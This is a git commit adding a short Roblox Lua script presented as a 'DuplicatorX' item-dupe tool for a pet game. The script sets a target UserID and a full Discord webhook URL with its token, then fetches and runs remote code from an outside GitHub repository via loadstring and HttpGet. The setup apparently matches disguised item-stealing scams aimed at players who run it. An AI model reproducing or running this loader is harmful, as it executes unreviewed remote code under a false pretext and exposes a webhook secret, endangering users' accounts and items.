fc006c74f6bf4ad0f32f28bc8a7a456390bf315d
Fenek2 <84258923+Fenek2@users.noreply.github.com>
2023-01-15 16:26:09 +0100

    Create script.lua

---
+++ Main/Dupe/script.lua
@@ -0,0 +1,4 @@
+_G.UserID = "2340029212"
+_G.WebHook = "https://discordapp.com/api/webhooks/1064202559105011834/J8fYygzV6i35QTDRPcNv1g1JRz3UD-A7vNTFW0_bjxFsgpDcZd4gH8LEj3L93O4rafqn"
+_G.LoadingScreenText = "DuplicatorX"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
